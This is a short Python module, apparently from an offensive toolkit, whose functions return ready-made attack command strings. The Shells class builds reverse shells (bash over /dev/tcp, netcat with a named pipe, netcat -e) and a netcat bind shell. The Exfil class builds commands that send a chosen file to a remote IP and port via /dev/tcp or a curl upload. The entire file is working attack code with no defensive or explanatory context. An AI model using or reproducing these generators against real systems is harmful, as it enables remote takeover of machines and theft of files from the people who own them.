class Shells:
	class Rev:
		def bash(ip,port,protocol):
			return f"bash -c \\\"/bin/bash -i >& /dev/{protocol}/{ip}/{port} 0>&1 &\\\"; "
		def nc(ip,port,protocol):
			return f"bash -c \\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f &\\\"; "
		def nce(ip,port,protocol):
			return f"bash -c \\\"nc {ip} {port} -e /bin/bash &\\\" ;"
	class Bind:
		def ncbind(ip,port,protocol):
			return f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip} {port} > /tmp/f &; "

class Exfil:
	def socket(ip,port,file):
		return f"cat {file} &> /dev/tcp/{ip}/{port} ;"
	def pflask(ip, port, file):
		return f"bash -c \\\"curl -F 'file=@{file}' http://{ip}:{port}/up &> /dev/null &\\\"; "




func_dict = {
	'bash':Shells.Rev.bash,
	'nc':Shells.Rev.nc,
	'nce':Shells.Rev.nce

}

func_dict2 = {
	'nc':Shells.Bind.ncbind
}
